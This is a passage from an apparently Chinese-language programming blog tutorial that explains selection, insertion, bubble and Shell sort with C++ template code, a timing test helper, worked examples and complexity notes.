&#x2F;&#x2F;INC_02_SELECTION_SORT_USING_TEMPLATE_STUDENT_H</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个时候main.cpp中的代码是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;Student.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void selectionSort(T arr[], int n)&#123;</span><br><span class="line"></span><br><span class="line">    for(int i &#x3D; 0 ; i &lt; n ; i ++)&#123;</span><br><span class="line"></span><br><span class="line">        int minIndex &#x3D; i;</span><br><span class="line">        for( int j &#x3D; i + 1 ; j &lt; n ; j ++ )</span><br><span class="line">            if( arr[j] &lt; arr[minIndex] )</span><br><span class="line">                minIndex &#x3D; j;</span><br><span class="line"></span><br><span class="line">        swap( arr[i] , arr[minIndex] );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试模板函数，传入整型数组</span><br><span class="line">    int a[10] &#x3D; &#123;10,9,8,7,6,5,4,3,2,1&#125;;</span><br><span class="line">    selectionSort( a , 10 );</span><br><span class="line">    for( int i &#x3D; 0 ; i &lt; 10 ; i ++ )</span><br><span class="line">        cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试模板函数，传入浮点数数组</span><br><span class="line">    float b[4] &#x3D; &#123;4.4,3.3,2.2,1.1&#125;;</span><br><span class="line">    selectionSort(b,4);</span><br><span class="line">    for( int i &#x3D; 0 ; i &lt; 4 ; i ++ )</span><br><span class="line">        cout&lt;&lt;b[i]&lt;&lt;&quot; &quot;;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试模板函数，传入字符串数组</span><br><span class="line">    string c[4] &#x3D; &#123;&quot;D&quot;,&quot;C&quot;,&quot;B&quot;,&quot;A&quot;&#125;;</span><br><span class="line">    selectionSort(c,4);</span><br><span class="line">    for( int i &#x3D; 0 ; i &lt; 4 ; i ++ )</span><br><span class="line">        cout&lt;&lt;c[i]&lt;&lt;&quot; &quot;;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试模板函数，传入自定义结构体Student数组</span><br><span class="line">    Student d[4] &#x3D; &#123; &#123;&quot;D&quot;,90&#125; , &#123;&quot;C&quot;,100&#125; , &#123;&quot;B&quot;,95&#125; , &#123;&quot;A&quot;,95&#125; &#125;;</span><br><span class="line">    selectionSort(d,4);</span><br><span class="line">    for( int i &#x3D; 0 ; i &lt; 4 ; i ++ )</span><br><span class="line">        cout&lt;&lt;d[i];</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写测试用例太麻烦了，所以自己写一个通用的测试用例</p><blockquote><p><strong>第三步：测试用例（SortTestHelper.h）</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#ifndef INC_03_SELECTION_SORT_GENERATE_TEST_CASES_SORTTESTHELPER_H</span><br><span class="line">#define INC_03_SELECTION_SORT_GENERATE_TEST_CASES_SORTTESTHELPER_H</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;ctime&gt;</span><br><span class="line">#include &lt;cassert&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace SortTestHelper &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 生成有n个元素的随机数组,每个元素的随机范围为[rangeL, rangeR]</span><br><span class="line">    int *generateRandomArray(int n, int rangeL, int rangeR) &#123;</span><br><span class="line"></span><br><span class="line">        assert(rangeL &lt;&#x3D; rangeR);</span><br><span class="line"></span><br><span class="line">        int *arr &#x3D; new int[n];</span><br><span class="line"></span><br><span class="line">        srand(time(NULL));</span><br><span class="line">        for (int i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">            arr[i] &#x3D; rand() % (rangeR - rangeL + 1) + rangeL;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    template&lt;typename T&gt;</span><br><span class="line">    void printArray(T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">            cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">#endif &#x2F;&#x2F;INC_03_SELECTION_SORT_GENERATE_TEST_CASES_SORTTESTHELPER_H</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>main.cpp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;SortTestHelper.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void selectionSort(T arr[], int n)&#123;</span><br><span class="line"></span><br><span class="line">    for(int i &#x3D; 0 ; i &lt; n ; i ++)&#123;</span><br><span class="line"></span><br><span class="line">        int minIndex &#x3D; i;</span><br><span class="line">        for( int j &#x3D; i + 1 ; j &lt; n ; j ++ )</span><br><span class="line">            if( arr[j] &lt; arr[minIndex] )</span><br><span class="line">                minIndex &#x3D; j;</span><br><span class="line"></span><br><span class="line">        swap( arr[i] , arr[minIndex] );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试排序算法辅助函数</span><br><span class="line">    int N &#x3D; 10000;</span><br><span class="line">    int *arr &#x3D; SortTestHelper::generateRandomArray(N,0,100000);</span><br><span class="line">    selectionSort(arr,N);</span><br><span class="line">    SortTestHelper::printArray(arr,N);</span><br><span class="line">    delete[] arr;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>第四步：性能展示</strong></p></blockquote><p>在测试用例中添加两个函数，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">bool isSorted(T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; n - 1; i++)</span><br><span class="line">            if (arr[i] &gt; arr[i + 1])</span><br><span class="line">                return false;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void testSort(const string &amp;sortName, void (*sort)(T[], int), T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        clock_t startTime &#x3D; clock();</span><br><span class="line">        sort(arr, n);</span><br><span class="line">        clock_t endTime &#x3D; clock();</span><br><span class="line"></span><br><span class="line">        assert(isSorted(arr, n));</span><br><span class="line">        cout &lt;&lt; sortName &lt;&lt; &quot; : &quot; &lt;&lt; double(endTime - startTime) &#x2F; CLOCKS_PER_SEC &lt;&lt; &quot; s&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>相应的<code>mian</code>函数中代码也需要改一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    int n &#x3D; 10000;</span><br><span class="line">    int *arr &#x3D; SortTestHelper::generateRandomArray(n,0,n);</span><br><span class="line">    SortTestHelper::testSort(&quot;Selection Sort&quot;, selectionSort, arr, n);</span><br><span class="line">    delete[] arr;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化改进"><a href="#优化改进" class="headerlink" title="优化改进"></a>优化改进</h3><p><strong>①二元选择排序</strong></p><p>改进思路：</p><p>简单选择排序，每趟循环只能确定一个元素排序后的定位。根据之前冒泡排序的经验，我们可以考虑改进为每趟循环确定两个元素（当前趟最大和最小记录）的位置,从而减少排序所需的循环次数。改进后对n个数据进行排序，最多只需进行[n/2]趟循环即可。</p><p><strong>②堆排序</strong></p><p>堆排序是一种树形选择排序，是对直接选择排序的有效改进。具体的分析我们留到后面讲堆排序时再详细说明。</p><p><strong>总结</strong></p><p>选择排序的主要优点与数据移动有关。如果某个元素位于正确的最终位置上，则它不会被移动。选择排序每次交换一对元素，它们当中至少有一个将被移到其最终位置上，因此对n个元素的表进行排序总共进行至多n-1次交换。在所有的完全依靠交换去移动元素的排序方法中，选择排序属于非常好的一种。</p><h2 id="插入排序法（insertion-sort）"><a href="#插入排序法（insertion-sort）" class="headerlink" title="插入排序法（insertion sort）"></a>插入排序法（insertion sort）</h2><h3 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h3><blockquote><p>每趟将一个元素，按照其关键字的大小插入到它前面已经排序的子序列中，依此重复，直到插入全部元素 </p></blockquote><p>常见的插入排序有插入排序（Insertion Sort），希尔排序（Shell Sort），二叉查找树排序（Tree Sort），图书馆排序（Library Sort），Patience排序（Patience Sort） </p><p>插入排序是基于<code>比较</code>的排序。所谓的基于比较，就是通过比较数组中的元素，看谁大谁小，根据结果来调整元素的位置。</p><p>因此，对于这类排序，就有两种基本的操作：</p><p>①<code>比较操作</code>； </p><p>②<code>交换操作</code>;</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>插入排序算法有种递归的思想在里面，它由N-1趟排序组成。初始时，只考虑数组下标0处的元素，只有一个元素，显然是有序的。</p><p>然后第一趟 对下标 1 处的元素进行排序，保证数组[0,1]上的元素有序；</p><p>第二趟 对下标 2 处的元素进行排序，保证数组[0,2]上的元素有序；</p><p>…..</p><p>…..</p><p>第N-1趟对下标 N-1 处的元素进行排序，保证数组[0,N-1]上的元素有序，也就是整个数组有序了。</p><p>它的<code>递归思想</code>就体现在：当对<code>位置 i</code> 处的元素进行排序时，<code>[0,i-1]</code>上的元素一定是已经<code>有序</code>的了。</p><h3 id="动态演示-1"><a href="#动态演示-1" class="headerlink" title="动态演示"></a>动态演示</h3><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.gif"></p></center><p>假设我们要对数组{12，4，5，2，6，14}进行插入排序，排序过程为： </p><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F1png.png"></p></center><h3 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a><strong>复杂度分析</strong></h3><p> <strong>一：</strong>插入排序的<code>时间复杂度 </code>就是判断<code>比较次数</code>有多少，而比较次数与  <code>待排数组的初始顺序</code>有关。</p><blockquote><p>①当待排数组<code>有序</code>时，没有移动操作，此时复杂度为O(N)；</p><p>②当待排数组是<code>逆序</code>时，比较次数达到最大–对于下标  i 处的元素，需要比较 i-1 次。总的比较次数：1+2+…+N-1 ，故时间复杂度为O(N^2)。</p></blockquote><br><p><strong>二：</strong>由于算法中只用到了一个临时变量，故<code>空间复杂度</code>为O(1)。</p><p>其实，插入排序的比较次数与数组的<code>逆序数</code>相关，因为插入排序在将某个元素插入到合适位置时，其实就是消除这个元素的逆序数。</p><br> <p><strong>三：由定理：N个互异数的数组的平均逆序数是 N(N-1)/4</strong>，可知：基于相邻元素之间的比较和交换的算法的时间复杂度的一个下界为O(N^2)。</p><p>比较冒泡排序啊。。。。它采用的<code>思路</code>是：相邻两个元素比较，将小的放在前头。故冒泡排序的时间复杂度为O(N^2)。。。</p><p>基于上面这个定理，另外一个排序算法：<code>希尔排序</code>，采用了<code>增量序列</code>。因此，它可能获得一个更好的时间复杂度。</p><p>比如，当希尔排序使用<code>Hibbard</code>增量序列时，它的最坏运行时间为O(N3/2)</p><blockquote><p>是否是稳定排序：稳定排序 </p></blockquote><h3 id="代码演示-1"><a href="#代码演示-1" class="headerlink" title="代码演示"></a>代码演示</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">void insertionSort(T arr[], int n) &#123;</span><br><span class="line">    &#x2F;&#x2F; i从1开始，因为对于插入排序而言，第1个元素我们不用考虑，它本身就已经有序了</span><br><span class="line">    for (int i &#x3D; 1; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;寻找元素arr[i]合适的插入位置</span><br><span class="line">        for (int j &#x3D; i; j &gt; 0; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            if (arr[j] &lt; arr[j - 1])</span><br><span class="line">                swap(arr[j], arr[j - 1]);</span><br><span class="line">            else</span><br><span class="line">                &#x2F;&#x2F; 如果&gt;&#x3D;,说明找到了位置，直接终止就OK了</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 写法二，更简洁，将if条件添加到for循环中去</span><br><span class="line">        &#x2F;&#x2F; for(int j &#x3D; i ; j &gt;0 &amp;&amp; arr[j] &lt; arr[j-1]; j--)&#123;</span><br><span class="line">        &#x2F;&#x2F; swap(arr[j], arr[j - 1]);</span><br><span class="line">        &#x2F;&#x2F;    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对于插入而言，第二轮循环可以提前结束 的，而对于选择排序而言，必须从头到尾扫描一遍，找到最小的元素，没有提前结束的机会 。</p></blockquote><p>插入排序会将之前的所有的比它大的元素进行<code>两两交换</code>（从小到大排列的排序），会增加一些<code>交换时间</code>，降低运行效率，下面我们来讨论一下它的优化算法 。</p><h3 id="优化改进-1"><a href="#优化改进-1" class="headerlink" title="优化改进"></a>优化改进</h3><blockquote><p>对于<code>交换</code>操作，可以优化成<code>移动</code>操作，即不直接进行两个元素的交换.</p><p>用一个<code>枢轴元素</code>(tmp)将当前元素先保存起来，然后执行移动操作，待确定了最终位置后，再将当前元素放入合适的位置。</p><p><strong>因为，交换操作需要<code>三次</code>赋值，而移动操作只需要<code>一次</code>赋值</strong>！ </p></blockquote><p>此时不是进行两两交换，而是把当前待插入的元素取出，让当前元素与之前的所有元素进行<code>一一比较</code>，前一个元素大于当前元素<code>直接覆盖</code>，而到了最后当找到当前元素的合适位置时<code>只需要一次交换</code>即可.</p><p>如序列：<code>3 5 2 1 4</code></p><p><strong>过程如下：</strong></p><p>元素5先存入临时变量<code>temp</code>中，跟前面元素比较，比前面元素大，然后拿出下一个元素2存入临时变量temp中，2与前一个元素5比较，2比5小，用5直接覆盖2</p><blockquote><p>结果序列为：<code>3 5 5 1 4</code> temp=2,</p></blockquote><p>然后temp再与前一个元素3进行比较，发现2比3小，然后3再覆盖刚才的位置，序列为<code>3 3 5 1 4</code>这时发现已经到<code>序列的头部</code>了，</p><p>然后将<code>temp=2复制给arr[0]</code>，就是<code>直接覆盖</code>第一个元素3，序列变为<code>2 3 5 1 4</code>，<code>第一轮排序</code>结束，跟直接插入排序太大的区别，只不过是<code>减少了不断交换的次数</code></p><p>用<code>直接复制覆盖取代</code>，这样当数据量特别大时效率就会提高很多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">void insertionSort(T arr[], int n) &#123;</span><br><span class="line">    &#x2F;&#x2F; i从1开始，因为对于插入排序而言，第1个元素我们不用考虑，它本身就已经有序了</span><br><span class="line">    for (int i &#x3D; 1; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;寻找元素arr[i]合适的插入位置</span><br><span class="line">        T e &#x3D; arr[i];</span><br><span class="line">        int j; &#x2F;&#x2F; j保存元素e应该插入的位置</span><br><span class="line">        for (j &#x3D; i; j &gt; 0 &amp;&amp; arr[j - 1] &gt; e; j--)</span><br><span class="line">            arr[j] &#x3D; arr[j - 1];</span><br><span class="line">        arr[j] &#x3D; e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="冒泡排序（Bubble-Sort）"><a href="#冒泡排序（Bubble-Sort）" class="headerlink" title="冒泡排序（Bubble Sort）"></a>冒泡排序（Bubble Sort）</h2><h3 id="算法思想-2"><a href="#算法思想-2" class="headerlink" title="算法思想"></a>算法思想</h3><blockquote><p>对相邻的元素进行两两比较，顺序相反则进行交换，这样，每一趟会将最小或最大的元素“浮”到顶端，最终达到完全有序 </p></blockquote><h3 id="实现逻辑-1"><a href="#实现逻辑-1" class="headerlink" title="实现逻辑"></a>实现逻辑</h3><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ol><h3 id="动态演示-2"><a href="#动态演示-2" class="headerlink" title="动态演示"></a>动态演示</h3><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.gif"></p></center><p>有一序列：9，3，1，4，2，7，8，6，5，其排序过程如下</p><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.png"></p></center><p>ps：这个图从网上找的 ！！！</p><h3 id="代码演示-2"><a href="#代码演示-2" class="headerlink" title="代码演示"></a>代码演示</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void bubble_sort(int a[], int len)&#123;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;总共比较n-1趟</span><br><span class="line">    for (int i &#x3D; 0; i &lt; len - 1 ; i++) &#123;</span><br><span class="line">        &#x2F;&#x2F;从后开始比较，让大的数向后移动，直到最小的数移动到最前面，完成一趟循环比较</span><br><span class="line">        for (int j &#x3D; len - 1; j &gt; i; j--) &#123;</span><br><span class="line">            &#x2F;&#x2F;交换位置</span><br><span class="line">            if (a[j] &lt; a[j - 1]) &#123;</span><br><span class="line">                int temp;</span><br><span class="line">                temp &#x3D; a[j];</span><br><span class="line">                a[j] &#x3D; a[j - 1];</span><br><span class="line">                a[j - 1] &#x3D; temp;</span><br><span class="line">            &#125;</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; len; i++) &#123;</span><br><span class="line">        cout &lt;&lt; a[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line">    int a[] &#x3D; &#123; 11, 22, 44 , 55 , 63 , 76 , 8 ,9 ,3 , 5 &#125;;</span><br><span class="line">    cout &lt;&lt; &quot;需要排序的一组数为：&quot; &lt;&lt; endl;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">        cout &lt;&lt; a[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;冒泡排序：&quot; &lt;&lt; endl;</span><br><span class="line">    bubble_sort(a, 10);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="希尔排序（Shell-Sort）"><a href="#希尔排序（Shell-Sort）" class="headerlink" title="希尔排序（Shell Sort）"></a>希尔排序（Shell Sort）</h2><p>1959年shell发明，第一个突破O(n^2)的排序算法，是简单插入排序的改进版。它与插入排序的不同是，它会<code>优先比较距离较远的元素</code>，希尔排序又称为<code>缩小增量排序</code></p><h3 id="算法思想-3"><a href="#算法思想-3" class="headerlink" title="算法思想"></a>算法思想</h3><p><code>基本思想</code>：对于<code>n</code>个待排序的数列，取一个小于n的整数<code>gap</code>(gap被称为步长)将待排序元素分成若干个组子序列，所有距离为gap的倍数的记录放在同一个组中；然后，对各组内的元素进行直接插入排序。 这一趟排序完成之后，每一个组的元素都是有序的。然后减小gap的值，并重复执行上述的分组和排序。重复这样的操作，<code>当gap=1时，整个数列就是有序的</code>。 </p><h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：</p><ul><li>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；</li><li>按增量序列个数k，对序列进行k 趟排序；</li><li>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ul><h3 id="动态演示-3"><a href="#动态演示-3" class="headerlink" title="动态演示"></a>动态演示</h3><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.gif"></p></center><p>下面以数列{80,30,60,40,20,10,50,70}为例，演示它的希尔排序过程。 </p><p><strong>第1趟：(gap=4)</strong> </p><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%B8%8C%E5%B0%941.jpg"></p></center><p>当gap=4时,意味着将数列分为4个组： {80,20},{30,10},{60,50},{40,70}。</p><p>对应数列： <strong>{80,30,60,40,20,10,50,70}</strong> 对这4个组分别进行排序，</p><p>排序结果： {20,80},{10,30},{50,60},{40,70}。</p><p> 对应数列： <strong>{20,10,50,40,80,30,60,70}</strong> </p><br><p><strong>第2趟：(gap=2)</strong> </p><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%B8%8C%E5%B0%942.jpg"></p></center><p>当gap=2时,意味着将数列分为2个组：{20,50,80,60}, {10,40,30,70}。 </p><p>对应数列： <strong>{20,10,50,40,80,30,60,70}</strong> </p><blockquote><p><strong>注意：</strong></p><p>{20,50,80,60}实际上有两个有序的数列{20,80}和{50,60}组成。  </p><p>{10,40,30,70}实际上有两个有序的数列{10,30}和{40,70}组成.</p></blockquote><p> 对这2个组分别进行排序，排序结果：{20,50,60,80}, {10,30,40,70}。 对应数列： <strong>{20,10,50,30,60,40,80,70}</strong> </p><br><p><strong>第3趟：(gap=1)</strong> </p><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%B8%8C%E5%B0%943.jpg"></p></center><p>当gap=1时,意味着将数列分为1个组：**{20,10,50,30,60,40,80,70}** </p><blockquote><p>注意：</p><p>{20,10,50,30,60,40,80,70}</p><p>实际上有两个有序的数列{20,50,60,80}和{10,30,40,70}组成。</p></blockquote><p> 对这1个组分别进行排序，排序结果：**{10,20,30,40,50,60,70,80}** </p><h3 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><br><p><strong>希尔排序时间复杂度</strong></p><p>希尔排序的时间复杂度与<code>增量</code>(即，步长gap)的选取有关。</p><p>例如，当增量为<code>1</code>时，希尔排序退化成了<code>直接插入排序</code>，此时的时间复杂度为O(N²)，而Hibbard增量的希尔排序的时间复杂度为O(N3/2)。</p><br><p><strong>希尔排序稳定性</strong></p><p>希尔排序是<code>不稳定</code>的算法，它满足稳定算法的定义。对于相同的两个数，可能由于分在不同的组中而导致它们的顺序发生变化。<br><code>算法稳定性</code> – 